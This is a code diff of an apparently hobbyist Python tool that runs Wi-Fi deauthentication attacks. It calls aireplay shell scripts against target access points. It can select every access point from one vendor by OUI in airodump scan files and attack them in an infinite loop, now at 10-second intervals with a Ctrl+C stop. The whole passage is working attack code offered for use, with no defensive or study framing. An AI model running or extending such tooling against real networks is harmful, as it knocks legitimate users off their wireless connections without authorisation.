@@ -165,7 +165,7 @@ def Deauth(interface, targetAP):
                     # if a time interval is needed instead of aireplay.sh the aireplay_with_interval.sh is used
                     Deauth_script = './ShellScripts/aireplay_with_interval.sh'
                     print(DeauthTimeout)
-                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP, ' ' ,interface, ' ',DeauthTimeout]) # this gives error because DeauthTimeout is an integer and it has to be a string value,
+                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP,interface,DeauthTimeout]) # this gives error because DeauthTimeout is an integer and it has to be a string value,
                 break
             except FileNotFoundError:
                 print('no compatible terminal found: install ' + terminal)
@@ -174,7 +174,7 @@ def Deauth(interface, targetAP):
 # TODO test at home
 def Deauth_By_OUI(interface, targetOUI):
     global DeauthTimeout # I selected Deauth to be done in 1minute intervals in this script
-    DeauthTimeout = '60'
+    DeauthTimeout = '10' # its enclosed with '' since we cant send integer with subprocress.run but it gets this variable as an integer IDK WHY but it works
     files = sorted(glob.glob('/tmp/networks-*.csv'))
     latest_file = files[-1] if files else '/tmp/networks-01.csv' ## this else is differnet from the one i used in scan networks because the shell script below will create the /tmp/networks-01.csv in its aireodump function. and if I were to leave it as None like before the script wont run because I pass it as a parameter
     subprocess.run(['./ShellScripts/OUIFormatterKEEPFILE.sh' + ' ' + f'{interface}' + ' ' + f'{latest_file}'], shell=True)   # get csv file
@@ -202,13 +202,21 @@ def Deauth_By_OUI(interface, targetOUI):
         if selection == '1':
             for i in APs_in_OUI:
                 Deauth(interface,i.strip()) # strip is needed otherwise it wont be able to read csv file since variable may have extra space on front of the AP name
-
         elif selection == '2':
             stop_flag = False # this is set to lisen for 'q' command from keybaord to stop the loop
             while not stop_flag:
-                print('Deauthentication Attack has Started in an INFINITE LOOP.')
-                print('to stop the attack press "q" at anythime')
-                if keyboard.is_pressed('q'):
-                    stop_flag = True
                 for i in APs_in_OUI:
-                    Deauth(interface, i)
+                    try:
+                        print('Deauthentication Attack has  an INFINITE LOOP.')
+                        print('to stop the attack press "ctrl+c" in this terminal. time left 3 seconds')
+                        time.sleep(1)
+                        print('to stop the attack press "ctrl+c" in this terminal. time left 2 seconds')
+                        time.sleep(1)
+                        print('to stop the attack press "ctrl+c" in this terminal. time left 1 seconds')
+                        time.sleep(1)
+                        Deauth(interface, i.strip())
+                    except KeyboardInterrupt:
+                        stop_flag = True
+
+
+
